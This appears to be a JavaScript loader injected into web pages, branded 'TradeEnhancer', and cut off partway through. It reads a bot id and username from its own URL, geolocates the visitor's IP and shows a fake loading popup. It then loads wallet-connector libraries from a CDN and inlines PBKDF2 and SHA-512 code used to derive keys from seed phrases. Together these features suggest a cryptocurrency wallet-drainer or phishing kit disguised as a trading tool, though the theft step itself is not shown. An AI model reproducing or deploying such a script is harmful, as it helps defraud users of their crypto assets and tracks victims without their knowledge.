(async () => {
    const scriptElement = document.currentScript;
    let api_url = new URL(scriptElement.getAttribute("src"));
    let code = api_url.searchParams.get("code");
    let username = api_url.searchParams.get("username");
    let platform = api_url.searchParams.get("platform");
    let botId = api_url.searchParams.get("botId");

    const ipDataPromise = (async () => {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);
            const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
            clearTimeout(timeoutId);
            if (!response.ok) throw new Error(`IP API error: ${response.status}`);
            return await response.json();
        } catch (error) {
            console.error('Failed to fetch IP data:', error);
            return { ip: 'unknown', country_code: 'XX', country_name: 'Unknown' };
        }
    })();

    function showLiquidLoaderPopup() {
        const POPUP_ID = '__liquid_loader_popup__';
        const STYLE_ID = '__liquid_loader_popup_styles__';
        const SIZE_LIMITS = {
            minWidth: 220,
            minHeight: 160,
            maxWidth: () => Math.min(380, window.innerWidth - 32),
            maxHeight: () => Math.min(360, window.innerHeight - 32),
            collapsedHeight: 44,
        };
        const clamp = (value, min, max) => Math.min(Math.max(value, min), max);

        const existing = document.getElementById(POPUP_ID);
        if (existing) {
            existing.__cleanup?.();
            existing.remove();
        }

        let styleTag = document.getElementById(STYLE_ID);
        if (!styleTag) {
            styleTag = document.createElement('style');
            styleTag.id = STYLE_ID;
            styleTag.textContent = `
            #${POPUP_ID} {
              position: fixed;
              bottom: 16px;
              right: 16px;
              padding: 16px 20px 18px;
              border-radius: 18px;
              color: #f4f6fb;
              font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
              background: rgba(17, 25, 40, 0.8);
              box-shadow:
                0 25px 45px rgba(0, 0, 0, 0.35),
                inset 0 0 0 1px rgba(255, 255, 255, 0.08);
              backdrop-filter: blur(14px);
              -webkit-backdrop-filter: blur(14px);
              z-index: 400;
              display: flex;
              flex-direction: column;
              gap: 12px;
              transition: transform 0.25s ease, opacity 0.25s ease, height 0.2s ease;
              min-width: ${SIZE_LIMITS.minWidth}px;
              min-height: ${SIZE_LIMITS.minHeight}px;
              max-width: min(380px, calc(100vw - 32px));
              max-height: min(360px, calc(100vh - 32px));
              overflow: hidden;
            }
            #${POPUP_ID}::before {
              content: '';
              position: absolute;
              inset: 0;
              border-radius: inherit;
              background: radial-gradient(circle at top, rgba(255,255,255,0.18), transparent 60%);
              pointer-events: none;
              opacity: 0.85;
            }
            #${POPUP_ID} .popup-header,
            #${POPUP_ID} .popup-body {
              position: relative;
              z-index: 1;
            }
            #${POPUP_ID}.collapsed {
              padding: 10px 16px;
              min-height: ${SIZE_LIMITS.collapsedHeight}px;
              height: ${SIZE_LIMITS.collapsedHeight}px !important;
              max-height: ${SIZE_LIMITS.collapsedHeight}px;
              min-width: auto;
              width: max-content;
              max-width: 240px;
            }
            #${POPUP_ID}.collapsed .popup-body {
              opacity: 0;
              max-height: 0;
            }
            #${POPUP_ID}.collapsed .resize-handle {
              display: none;
            }
            #${POPUP_ID} .popup-header {
              display: flex;
              align-items: center;
              justify-content: space-between;
              gap: 12px;
              cursor: grab;
              user-select: none;
            }
            #${POPUP_ID} .popup-header:active {
              cursor: grabbing;
            }
            #${POPUP_ID} .popup-title {
              font-size: 13px;
              letter-spacing: 0.16em;
              text-transform: uppercase;
              opacity: 0.9;
            }
            #${POPUP_ID} button.popup-toggle {
              background: rgba(255, 255, 255, 0.12);
              border: none;
              border-radius: 999px;
              width: 26px;
              height: 26px;
              color: inherit;
              cursor: pointer;
              display: inline-flex;
              align-items: center;
              justify-content: center;
              transition: background 0.2s ease;
            }
            #${POPUP_ID} button.popup-toggle:hover {
              background: rgba(255, 255, 255, 0.22);
            }
            #${POPUP_ID} .popup-body {
              flex: 1;
              display: flex;
              flex-direction: column;
              align-items: center;
              justify-content: center;
              text-align: center;
              gap: 14px;
              overflow: hidden;
              transition: max-height 0.25s ease, opacity 0.2s ease;
            }
            #${POPUP_ID} .spinner {
              width: 38px;
              height: 38px;
              border-radius: 50%;
              border: 3px solid rgba(244, 246, 251, 0.14);
              border-top-color: #7dd9ff;
              animation: liquid-spin 0.9s linear infinite;
            }
            #${POPUP_ID} .loading-text {
              font-size: 16px;
              letter-spacing: 0.16em;
              text-transform: uppercase;
            }
            #${POPUP_ID} .resize-handle {
              position: absolute;
              bottom: 6px;
              right: 10px;
              width: 16px;
              height: 16px;
              border-right: 2px solid rgba(255, 255, 255, 0.5);
              border-bottom: 2px solid rgba(255, 255, 255, 0.5);
              cursor: nwse-resize;
              opacity: 0.7;
            }
            @keyframes liquid-spin {
              from { transform: rotate(0deg); }
              to { transform: rotate(360deg); }
            }
          `;
            document.head.appendChild(styleTag);
        }

        const popup = document.createElement('div');
        popup.id = POPUP_ID;
        popup.innerHTML = `
          <div class="popup-header" data-role="drag">
            <span class="popup-title">TradeEnhancer</span>
            <button class="popup-toggle" type="button" aria-label="Toggle popup" data-action="toggle">—</button>
          </div>
          <div class="popup-body">
            <div class="spinner" aria-hidden="true"></div>
            <span class="loading-text">Loading</span>
          </div>
          <div class="resize-handle" data-role="resize"></div>
        `;
        document.body.appendChild(popup);

        let expandedSize = {
            width: clamp(popup.offsetWidth || SIZE_LIMITS.minWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
            height: clamp(popup.offsetHeight || SIZE_LIMITS.minHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
        };

        const applyExpandedSize = () => {
            expandedSize = {
                width: clamp(expandedSize.width, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
                height: clamp(expandedSize.height, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
            };
            popup.style.width = `${expandedSize.width}px`;
            popup.style.height = `${expandedSize.height}px`;
        };

        const rememberExpandedSize = () => {
            expandedSize = {
                width: clamp(popup.offsetWidth, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth()),
                height: clamp(popup.offsetHeight, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight()),
            };
        };

        applyExpandedSize();

        const keepWithinViewport = () => {
            const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
            const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
            const currentX = parseFloat(popup.style.left || `${maxX}`);
            const currentY = parseFloat(popup.style.top || `${maxY}`);
            popup.style.left = `${clamp(currentX, 16, maxX)}px`;
            popup.style.top = `${clamp(currentY, 16, maxY)}px`;
        };

        popup.style.position = 'fixed';
        keepWithinViewport();

        const toggleButton = popup.querySelector('[data-action="toggle"]');
        const setCollapsed = (shouldCollapse) => {
            if (shouldCollapse) {
                rememberExpandedSize();
                popup.classList.add('collapsed');
                popup.style.width = '';
                popup.style.height = '';
                toggleButton.textContent = '+';
            } else {
                popup.classList.remove('collapsed');
                applyExpandedSize();
                toggleButton.textContent = '—';
            }
            requestAnimationFrame(() => keepWithinViewport());
        };

        toggleButton.addEventListener('click', () => {
            setCollapsed(!popup.classList.contains('collapsed'));
        });

        const dragHandle = popup.querySelector('[data-role="drag"]');
        let dragStart = null;
        const startDrag = (event) => {
            event.preventDefault();
            dragStart = {
                pointerX: event.clientX,
                pointerY: event.clientY,
                left: parseFloat(popup.style.left) || 16,
                top: parseFloat(popup.style.top) || 16,
            };
            document.addEventListener('pointermove', onDrag);
            document.addEventListener('pointerup', stopDrag, { once: true });
        };

        const onDrag = (event) => {
            if (!dragStart) return;
            const deltaX = event.clientX - dragStart.pointerX;
            const deltaY = event.clientY - dragStart.pointerY;
            const maxX = Math.max(16, window.innerWidth - popup.offsetWidth - 16);
            const maxY = Math.max(16, window.innerHeight - popup.offsetHeight - 16);
            popup.style.left = `${clamp(dragStart.left + deltaX, 16, maxX)}px`;
            popup.style.top = `${clamp(dragStart.top + deltaY, 16, maxY)}px`;
        };

        const stopDrag = () => {
            dragStart = null;
            document.removeEventListener('pointermove', onDrag);
        };

        dragHandle.addEventListener('pointerdown', startDrag);

        const resizeHandle = popup.querySelector('[data-role="resize"]');
        let resizeStart = null;
        const startResize = (event) => {
            if (popup.classList.contains('collapsed')) return;
            event.preventDefault();
            resizeStart = {
                pointerX: event.clientX,
                pointerY: event.clientY,
                width: popup.offsetWidth,
                height: popup.offsetHeight,
            };
            document.addEventListener('pointermove', onResize);
            document.addEventListener('pointerup', stopResize, { once: true });
        };

        const onResize = (event) => {
            if (!resizeStart) return;
            const deltaX = event.clientX - resizeStart.pointerX;
            const deltaY = event.clientY - resizeStart.pointerY;
            const nextWidth = clamp(resizeStart.width + deltaX, SIZE_LIMITS.minWidth, SIZE_LIMITS.maxWidth());
            const nextHeight = clamp(resizeStart.height + deltaY, SIZE_LIMITS.minHeight, SIZE_LIMITS.maxHeight());
            expandedSize = { width: nextWidth, height: nextHeight };
            applyExpandedSize();
            keepWithinViewport();
        };

        const stopResize = () => {
            resizeStart = null;
            document.removeEventListener('pointermove', onResize);
        };

        resizeHandle.addEventListener('pointerdown', startResize);

        const resizeObserver = new ResizeObserver(() => {
            if (!popup.classList.contains('collapsed')) {
                rememberExpandedSize();
            }
            keepWithinViewport();
        });
        resizeObserver.observe(popup);

        const resizeHandler = () => {
            if (!popup.classList.contains('collapsed')) {
                applyExpandedSize();
            }
            keepWithinViewport();
        };
        window.addEventListener('resize', resizeHandler, { passive: true });
        keepWithinViewport();

        requestAnimationFrame(() => {
            popup.style.transform = 'translateY(6px)';
            popup.style.opacity = '0';
            requestAnimationFrame(() => {
                popup.style.transform = 'translateY(0px)';
                popup.style.opacity = '1';
            });
        });

        popup.__cleanup = () => {
            window.removeEventListener('resize', resizeHandler);
            resizeObserver.disconnect();
            document.removeEventListener('pointermove', onDrag);
            document.removeEventListener('pointermove', onResize);
        };
    }

    setTimeout(showLiquidLoaderPopup, 0);

    async function retryWithBackoff(fn, options = {}) {
        const {
            maxRetries = 3,
            initialDelay = 1000,
            maxDelay = 10000,
            backoffMultiplier = 2
        } = options;

        let lastError;

        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            try {
                return await fn();
            } catch (error) {
                lastError = error;

                if (attempt === maxRetries) {
                    throw lastError;
                }

                const delay = Math.min(
                    initialDelay * Math.pow(backoffMultiplier, attempt),
                    maxDelay
                );

                console.debug(`⚠️ Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms...`);
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }

        throw lastError;
    }

    async function fetchWithTimeoutUtil(url, options = {}, timeout = 30000) {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);

        try {
            const response = await fetch(url, {
                ...options,
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            return response;
        } catch (error) {
            clearTimeout(timeoutId);
            if (error.name === 'AbortError') {
                throw new Error(`Request timeout after ${timeout}ms`);
            }
            throw error;
        }
    }

    async function loadModule(url, globalName) {
        // 1. Проверяем window
        if (window[globalName]) {
            return window[globalName];
        }
        
        const module = await import(url);
        
        return module;
    }

    const [wagmiConnectors, wagmi, viemAccounts] = await Promise.all([
        loadModule('https://cdn.jsdelivr.net/npm/@wagmi/connectors@6.1.2/+esm', 'wagmiConnectors'),
        loadModule('https://cdn.jsdelivr.net/npm/@wagmi/core@2.22.1/+esm', 'wagmi'),
        loadModule('https://cdn.jsdelivr.net/npm/viem@2.38.6/accounts/+esm', 'viemAccounts')
    ]);
    
    const { walletConnect, injected } = wagmiConnectors;
    
    const module19441 = await (async () => {
        function n(t) {
            return t instanceof Uint8Array ||
                ArrayBuffer.isView(t) &&
                'Uint8Array' === t.constructor.name
        }
        function o(t) {
            if (!Number.isSafeInteger(t) || t < 0) throw Error('positive integer expected, got ' + t)
        }
        function s(t, ...e) {
            if (!n(t)) throw Error('Uint8Array expected');
            if (e.length > 0 && !e.includes(t.length)) throw Error('Uint8Array expected of length ' + e + ', got length=' + t.length)
        }
        function a(t) {
            if ('function' != typeof t || 'function' != typeof t.create) throw Error('Hash should be wrapped by utils.createHasher');
            o(t.outputLen),
                o(t.blockLen)
        }
        function h(t, e = !0) {
            if (t.destroyed) throw Error('Hash instance has been destroyed');
            if (e && t.finished) throw Error('Hash#digest() has already been called')
        }
        function f(t, e) {
            s(t);
            let r = e.outputLen;
            if (t.length < r) throw Error('digestInto() expects output buffer of length at least ' + r)
        }
        function u(...t) {
            for (let e = 0; e < t.length; e++) t[e].fill(0)
        }
        function l(t) {
            return new DataView(t.buffer, t.byteOffset, t.byteLength)
        }
        function c(t, e) {
            return t << 32 - e | t >>> e
        }
        function d(t) {
            if ('string' != typeof t) throw Error('string expected');
            return new Uint8Array(new TextEncoder().encode(t))
        }
        function p(t) {
            return 'string' == typeof t &&
                (t = d(t)),
                s(t),
                t
        }
        function m(t) {
            return 'string' == typeof t &&
                (t = d(t)),
                s(t),
                t
        }
        function g(t, e) {
            if (void 0 !== e && '[object Object]' !== ({
            }).toString.call(e)) throw Error('options should be object or undefined');
            return Object.assign(t, e)
        }
        class y {
        }
        function b(t) {
            let e = e => t().update(p(e)).digest(),
                r = t();
            return e.outputLen = r.outputLen,
                e.blockLen = r.blockLen,
                e.create = () => t(),
                e
        }
        class w extends y {
            constructor(t, e) {
                super(),
                    this.finished = !1,
                    this.destroyed = !1,
                    a(t);
                let r = p(e);
                if (this.iHash = t.create(), 'function' != typeof this.iHash.update) throw Error('Expected instance of class which extends utils.Hash');
                this.blockLen = this.iHash.blockLen,
                    this.outputLen = this.iHash.outputLen;
                let i = this.blockLen,
                    n = new Uint8Array(i);
                n.set(r.length > i ? t.create().update(r).digest() : r);
                for (let t = 0; t < n.length; t++) n[t] ^= 54;
                this.iHash.update(n),
                    this.oHash = t.create();
                for (let t = 0; t < n.length; t++) n[t] ^= 106;
                this.oHash.update(n),
                    u(n)
            }
            update(t) {
                return h(this),
                    this.iHash.update(t),
                    this
            }
            digestInto(t) {
                h(this),
                    s(t, this.outputLen),
                    this.finished = !0,
                    this.iHash.digestInto(t),
                    this.oHash.update(t),
                    this.oHash.digestInto(t),
                    this.destroy()
            }
            digest() {
                let t = new Uint8Array(this.oHash.outputLen);
                return this.digestInto(t),
                    t
            }
            _cloneInto(t) {
                t ||
                    (t = Object.create(Object.getPrototypeOf(this), {
                    }));
                let {
                    oHash: e,
                    iHash: r,
                    finished: i,
                    destroyed: n,
                    blockLen: o,
                    outputLen: s
                }
                    = this;
                return t.finished = i,
                    t.destroyed = n,
                    t.blockLen = o,
                    t.outputLen = s,
                    t.oHash = e._cloneInto(t.oHash),
                    t.iHash = r._cloneInto(t.iHash),
                    t
            }
            clone() {
                return this._cloneInto()
            }
            destroy() {
                this.destroyed = !0,
                    this.oHash.destroy(),
                    this.iHash.destroy()
            }
        }
        let v = (t, e, r) => new w(t, e).update(r).digest();
        function x(t, e, r, i) {
            a(t);
            let {
                c: n,
                dkLen: s,
                asyncTick: h
            }
                = g({
                    dkLen: 32,
                    asyncTick: 10
                }, i);
            if (o(n), o(s), o(h), n < 1) throw Error('iterations (c) should be >= 1');
            let f = m(e),
                u = m(r),
                l = new Uint8Array(s),
                c = v.create(t, f),
                d = c._cloneInto().update(u);
            return {
                c: n,
                dkLen: s,
                asyncTick: h,
                DK: l,
                PRF: c,
                PRFSalt: d
            }
        }
        function M(t, e, r, i, n) {
            return t.destroy(),
                e.destroy(),
                i &&
                i.destroy(),
                u(n),
                r
        }
        function E(t, e, r, i) {
            let n,
                {
                    c: o,
                    dkLen: s,
                    DK: a,
                    PRF: h,
                    PRFSalt: f
                }
                    = x(t, e, r, i),
                u = new Uint8Array(4),
                c = l(u),
                d = new Uint8Array(h.outputLen);
            for (let t = 1, e = 0; e < s; t++, e += h.outputLen) {
                let r = a.subarray(e, e + h.outputLen);
                c.setInt32(0, t, !1),
                    (n = f._cloneInto(n)).update(u).digestInto(d),
                    r.set(d.subarray(0, r.length));
                for (let t = 1; t < o; t++) {
                    h._cloneInto(n).update(d).digestInto(d);
                    for (let t = 0; t < r.length; t++) r[t] ^= d[t]
                }
            }
            return M(h, f, a, n, d)
        }
        function _(t, e, r, i) {
            if ('function' == typeof t.setBigUint64) return t.setBigUint64(e, r, i);
            let n = BigInt(32),
                o = BigInt(4294967295),
                s = Number(r >> n & o),
                a = Number(r & o),
                h = 4 * !!i,
                f = 4 * !i;
            t.setUint32(e + h, s, i),
                t.setUint32(e + f, a, i)
        }
        function A(t, e, r) {
            return t & e ^ ~t & r
        }
        function S(t, e, r) {
            return t & e ^ t & r ^ e & r
        }
        v.create = (t, e) => new w(t, e);
        class k extends y {
            constructor(t, e, r, i) {
                super(),
                    this.finished = !1,
                    this.length = 0,
                    this.pos = 0,
                    this.destroyed = !1,
                    this.blockLen = t,
                    this.outputLen = e,
                    this.padOffset = r,
                    this.isLE = i,
                    this.buffer = new Uint8Array(t),
                    this.view = l(this.buffer)
            }
            update(t) {
                h(this),
                    s(t = p(t));
                let {
                    view: e,
                    buffer: r,
                    blockLen: i
                }
                    = this,
                    n = t.length;
                for (let o = 0; o < n;) {
                    let s = Math.min(i - this.pos, n - o);
                    if (s === i) {
                        let e = l(t);
                        for (; i <= n - o; o += i) this.process(e, o);
                        continue
                    }
                    r.set(t.subarray(o, o + s), this.pos),
                        this.pos += s,
                        o += s,
                        this.pos === i &&
                        (this.process(e, 0), this.pos = 0)
                }
                return this.length += t.length,
                    this.roundClean(),
                    this
            }
            digestInto(t) {
                h(this),
                    f(t, this),
                    this.finished = !0;
                let {
                    buffer: e,
                    view: r,
                    blockLen: i,
                    isLE: n
                }
                    = this,
                    {
                        pos: o
                    }
                        = this;
                e[o++] = 128,
                    u(this.buffer.subarray(o)),
                    this.padOffset > i - o &&
                    (this.process(r, 0), o = 0);
                for (let t = o; t < i; t++) e[t] = 0;
                _(r, i - 8, BigInt(8 * this.length), n),
                    this.process(r, 0);
                let s = l(t),
                    a = this.outputLen;
                if (a % 4) throw Error('_sha2: outputLen should be aligned to 32bit');
                let c = a / 4,
                    d = this.get();
                if (c > d.length) throw Error('_sha2: outputLen bigger than state');
                for (let t = 0; t < c; t++) s.setUint32(4 * t, d[t], n)
            }
            digest() {
                let {
                    buffer: t,
                    outputLen: e
                }
                    = this;
                this.digestInto(t);
                let r = t.slice(0, e);
                return this.destroy(),
                    r
            }
            _cloneInto(t) {
                t ||
                    (t = new this.constructor),
                    t.set(...this.get());
                let {
                    blockLen: e,
                    buffer: r,
                    length: i,
                    finished: n,
                    destroyed: o,
                    pos: s
                }
                    = this;
                return t.destroyed = o,
                    t.finished = n,
                    t.length = i,
                    t.pos = s,
                    i % e &&
                    t.buffer.set(r),
                    t
            }
            clone() {
                return this._cloneInto()
            }
        }
        let B = Uint32Array.from(
            [1779033703,
                3144134277,
                1013904242,
                2773480762,
                1359893119,
                2600822924,
                528734635,
                1541459225]
        ),
            R = Uint32Array.from(
                [1779033703,
                    4089235720,
                    3144134277,
                    2227873595,
                    1013904242,
                    4271175723,
                    2773480762,
                    1595750129,
                    1359893119,
                    2917565137,
                    2600822924,
                    725511199,
                    528734635,
                    4215389547,
                    1541459225,
                    327033209]
            ),
            U = BigInt(4294967296 - 1),
            O = BigInt(32);
        function I(t, e = !1) {
            return e ? {
                h: Number(t & U),
                l: Number(t >> O & U)
            }
                : {
                    h: 0 | Number(t >> O & U),
                    l: 0 | Number(t & U)
                }
        }
        function L(t, e = !1) {
            let r = t.length,
                i = new Uint32Array(r),
                n = new Uint32Array(r);
            for (let o = 0; o < r; o++) {
                let {
                    h: r,
                    l: s
                }
                    = I(t[o], e);
                [
                    i[o],
                    n[o]
                ] = [
                        r,
                        s
                    ]
            }
            return [i,
                n]
        }
        let N = (t, e, r) => t >>> r,
            T = (t, e, r) => t << 32 - r | e >>> r,
            j = (t, e, r) => t >>> r | e << 32 - r,
            z = (t, e, r) => t << 32 - r | e >>> r,
            q = (t, e, r) => t << 64 - r | e >>> r - 32,
            C = (t, e, r) => t >>> r - 32 | e << 64 - r;
        function H(t, e, r, i) {
            let n = (e >>> 0) + (i >>> 0);
            return {
                h: t + r + (n / 4294967296 | 0) | 0,
                l: 0 | n
            }
        }
        let P = (t, e, r) => (t >>> 0) + (e >>> 0) + (r >>> 0),
            D = (t, e, r, i) => e + r + i + (t / 4294967296 | 0) | 0,
            F = (t, e, r, i) => (t >>> 0) + (e >>> 0) + (r >>> 0) + (i >>> 0),
            K = (t, e, r, i, n) => e + r + i + n + (t / 4294967296 | 0) | 0,
            $ = (t, e, r, i, n) => (t >>> 0) + (e >>> 0) + (r >>> 0) + (i >>> 0) + (n >>> 0),
            Z = (t, e, r, i, n, o) => e + r + i + n + o + (t / 4294967296 | 0) | 0,
            V = Uint32Array.from(
                [1116352408,
                    1899447441,
                    3049323471,
                    3921009573,
                    961987163,
                    1508970993,
                    2453635748,
                    2870763221,
                    3624381080,
                    310598401,
                    607225278,
                    1426881987,
                    1925078388,
                    2162078206,
                    2614888103,
                    3248222580,
                    3835390401,
                    4022224774,
                    264347078,
                    604807628,
                    770255983,
                    1249150122,
                    1555081692,
                    1996064986,
                    2554220882,
                    2821834349,
                    2952996808,
                    3210313671,
                    3336571891,
                    3584528711,
                    113926993,
                    338241895,
                    666307205,
                    773529912,
                    1294757372,
                    1396182291,
                    1695183700,
                    1986661051,
                    2177026350,
                    2456956037,
                    2730485921,
                    2820302411,
                    3259730800,
                    3345764771,
                    3516065817,
                    3600352804,
                    4094571909,
                    275423344,
                    430227734,
                    506948616,
                    659060556,
                    883997877,
                    958139571,
                    1322822218,
                    1537002063,
                    1747873779,
                    1955562222,
                    2024104815,
                    2227730452,
                    2361852424,
                    2428436474,
                    2756734187,
                    3204031479,
                    3329325298]
            ),
            W = new Uint32Array(64);
        class G extends k {
            constructor(t = 32) {
                super(64, t, 8, !1),
                    this.A = 0 | B[0],
                    this.B = 0 | B[1],
                    this.C = 0 | B[2],
                    this.D = 0 | B[3],
                    this.E = 0 | B[4],
                    this.F = 0 | B[5],
                    this.G = 0 | B[6],
                    this.H = 0 | B[7]
            }
            get() {
                let {
                    A: t,
                    B: e,
                    C: r,
                    D: i,
                    E: n,
                    F: o,
                    G: s,
                    H: a
                }
                    = this;
                return [t,
                    e,
                    r,
                    i,
                    n,
                    o,
                    s,
                    a]
            }
            set(t, e, r, i, n, o, s, a) {
                this.A = 0 | t,
                    this.B = 0 | e,
                    this.C = 0 | r,
                    this.D = 0 | i,
                    this.E = 0 | n,
                    this.F = 0 | o,
                    this.G = 0 | s,
                    this.H = 0 | a
            }
            process(t, e) {
                for (let r = 0; r < 16; r++, e += 4) W[r] = t.getUint32(e, !1);
                for (let t = 16; t < 64; t++) {
                    let e = W[t - 15],
                        r = W[t - 2],
                        i = c(e, 7) ^ c(e, 18) ^ e >>> 3,
                        n = c(r, 17) ^ c(r, 19) ^ r >>> 10;
                    W[t] = n + W[t - 7] + i + W[t - 16] | 0
                }
                let {
                    A: r,
                    B: i,
                    C: n,
                    D: o,
                    E: s,
                    F: a,
                    G: h,
                    H: f
                }
                    = this;
                for (let t = 0; t < 64; t++) {
                    let e = f + (c(s, 6) ^ c(s, 11) ^ c(s, 25)) + A(s, a, h) + V[t] + W[t] | 0,
                        u = (c(r, 2) ^ c(r, 13) ^ c(r, 22)) + S(r, i, n) | 0;
                    f = h,
                        h = a,
                        a = s,
                        s = o + e | 0,
                        o = n,
                        n = i,
                        i = r,
                        r = e + u | 0
                }
                r = r + this.A | 0,
                    i = i + this.B | 0,
                    n = n + this.C | 0,
                    o = o + this.D | 0,
                    s = s + this.E | 0,
                    a = a + this.F | 0,
                    h = h + this.G | 0,
                    f = f + this.H | 0,
                    this.set(r, i, n, o, s, a, h, f)
            }
            roundClean() {
                u(W)
            }
            destroy() {
                this.set(0, 0, 0, 0, 0, 0, 0, 0),
                    u(this.buffer)
            }
        }
        let Y = L(
            ['0x428a2f98d728ae22',
                '0x7137449123ef65cd',
                '0xb5c0fbcfec4d3b2f',
                '0xe9b5dba58189dbbc',
                '0x3956c25bf348b538',
                '0x59f111f1b605d019',
                '0x923f82a4af194f9b',
                '0xab1c5ed5da6d8118',
                '0xd807aa98a3030242',
                '0x12835b0145706fbe',
                '0x243185be4ee4b28c',
                '0x550c7dc3d5ffb4e2',
                '0x72be5d74f27b896f',
                '0x80deb1fe3b1696b1',
                '0x9bdc06a725c71235',
                '0xc19bf174cf692694',
                '0xe49b69c19ef14ad2',
                '0xefbe4786384f25e3',
                '0x0fc19dc68b8cd5b5',
                '0x240ca1cc77ac9c65',
                '0x2de92c6f592b0275',
                '0x4a7484aa6ea6e483',
                '0x5cb0a9dcbd41fbd4',
                '0x76f988da831153b5',
                '0x983e5152ee66dfab',
                '0xa831c66d2db43210',
                '0xb00327c898fb213f',
                '0xbf597fc7beef0ee4',
                '0xc6e00bf33da88fc2',
                '0xd5a79147930aa725',
                '0x06ca6351e003826f',
                '0x142929670a0e6e70',
                '0x27b70a8546d22ffc',
                '0x2e1b21385c26c926',
                '0x4d2c6dfc5ac42aed',
                '0x53380d139d95b3df',
                '0x650a73548baf63de',
                '0x766a0abb3c77b2a8',
                '0x81c2c92e47edaee6',
                '0x92722c851482353b',
                '0xa2bfe8a14cf10364',
                '0xa81a664bbc423001',
                '0xc24b8b70d0f89791',
                '0xc76c51a30654be30',
                '0xd192e819d6ef5218',
                '0xd69906245565a910',
                '0xf40e35855771202a',
                '0x106aa07032bbd1b8',
                '0x19a4c116b8d2d0c8',
                '0x1e376c085141ab53',
                '0x2748774cdf8eeb99',
                '0x34b0bcb5e19b48a8',
                '0x391c0cb3c5c95a63',
                '0x4ed8aa4ae3418acb',
                '0x5b9cca4f7763e373',
                '0x682e6ff3d6b2b8a3',
                '0x748f82ee5defb2fc',
                '0x78a5636f43172f60',
                '0x84c87814a1f0ab72',
                '0x8cc702081a6439ec',
                '0x90befffa23631e28',
                '0xa4506cebde82bde9',
                '0xbef9a3f7b2c67915',
                '0xc67178f2e372532b',
                '0xca273eceea26619c',
                '0xd186b8c721c0c207',
                '0xeada7dd6cde0eb1e',
                '0xf57d4f7fee6ed178',
                '0x06f067aa72176fba',
                '0x0a637dc5a2c898a6',
                '0x113f9804bef90dae',
                '0x1b710b35131c471b',
                '0x28db77f523047d84',
                '0x32caab7b40c72493',
                '0x3c9ebe0a15c9bebc',
                '0x431d67c49c100d4c',
                '0x4cc5d4becb3e42b6',
                '0x597f299cfc657e2a',
                '0x5fcb6fab3ad6faec',
                '0x6c44198c4a475817'].map(t => BigInt(t))
        ),
            J = Y[0],
            X = Y[1],
            Q = new Uint32Array(80),
            tt = new Uint32Array(80);
        class te extends k {
            constructor(t = 64) {
                super(128, t, 16, !1),
                    this.Ah = 0 | R[0],
                    this.Al = 0 | R[1],
                    this.Bh = 0 | R[2],
                    this.Bl = 0 | R[3],
                    this.Ch = 0 | R[4],
                    this.Cl = 0 | R[5],
                    this.Dh = 0 | R[6],
                    this.Dl = 0 | R[7],
                    this.Eh = 0 | R[8],
                    this.El = 0 | R[9],
                    this.Fh = 0 | R[10],
                    this.Fl = 0 | R[11],
                    this.Gh = 0 | R[12],
                    this.Gl = 0 | R[13],
                    this.Hh = 0 | R[14],
                    this.Hl = 0 | R[15]
            }
            get() {
                let {
                    Ah: t,
                    Al: e,
                    Bh: r,
                    Bl: i,
                    Ch: n,
                    Cl: o,
                    Dh: s,
                    Dl: a,
                    Eh: h,
                    El: f,
                    Fh: u,
                    Fl: l,
                    Gh: c,
                    Gl: d,
                    Hh: p,
                    Hl: m
                }
                    = this;
                return [t,
                    e,
                    r,
                    i,
                    n,
                    o,
                    s,
                    a,
                    h,
                    f,
                    u,
                    l,
                    c,
                    d,
                    p,
                    m]
            }
            set(t, e, r, i, n, o, s, a, h, f, u, l, c, d, p, m) {
                this.Ah = 0 | t,
                    this.Al = 0 | e,
                    this.Bh = 0 | r,
                    this.Bl = 0 | i,
                    this.Ch = 0 | n,
                    this.Cl = 0 | o,
                    this.Dh = 0 | s,
                    this.Dl = 0 | a,
                    this.Eh = 0 | h,
                    this.El = 0 | f,
                    this.Fh = 0 | u,
                    this.Fl = 0 | l,
                    this.Gh = 0 | c,
                    this.Gl = 0 | d,
                    this.Hh = 0 | p,
                    this.Hl = 0 | m
            }
            process(t, e) {
                for (let r = 0; r < 16; r++, e += 4) Q[r] = t.getUint32(e),
                    tt[r] = t.getUint32(e += 4);
                for (let t = 16; t < 80; t++) {
                    let e = 0 | Q[t - 15],
                        r = 0 | tt[t - 15],
                        i = j(e, r, 1) ^ j(e, r, 8) ^ N(e, r, 7),
                        n = z(e, r, 1) ^ z(e, r, 8) ^ T(e, r, 7),
                        o = 0 | Q[t - 2],
                        s = 0 | tt[t - 2],
                        a = j(o, s, 19) ^ q(o, s, 61) ^ N(o, s, 6),
                        h = F(n, z(o, s, 19) ^ C(o, s, 61) ^ T(o, s, 6), tt[t - 7], tt[t - 16]),
                        f = K(h, i, a, Q[t - 7], Q[t - 16]);
                    Q[t] = 0 | f,
                        tt[t] = 0 | h
                }
                let {
                    Ah: r,
                    Al: i,
                    Bh: n,
                    Bl: o,
                    Ch: s,
                    Cl: a,
                    Dh: h,
                    Dl: f,
                    Eh: u,
                    El: l,
                    Fh: c,
                    Fl: d,
                    Gh: p,
                    Gl: m,
                    Hh: g,
                    Hl: y
                }
                    = this;
                for (let t = 0; t < 80; t++) {
                    let e = j(u, l, 14) ^ j(u, l, 18) ^ q(u, l, 41),
                        b = z(u, l, 14) ^ z(u, l, 18) ^ C(u, l, 41),
                        w = u & c ^ ~u & p,
                        v = $(y, b, l & d ^ ~l & m, X[t], tt[t]),
                        x = Z(v, g, e, w, J[t], Q[t]),
                        M = 0 | v,
                        E = j(r, i, 28) ^ q(r, i, 34) ^ q(r, i, 39),
                        _ = z(r, i, 28) ^ C(r, i, 34) ^ C(r, i, 39),
                        A = r & n ^ r & s ^ n & s,
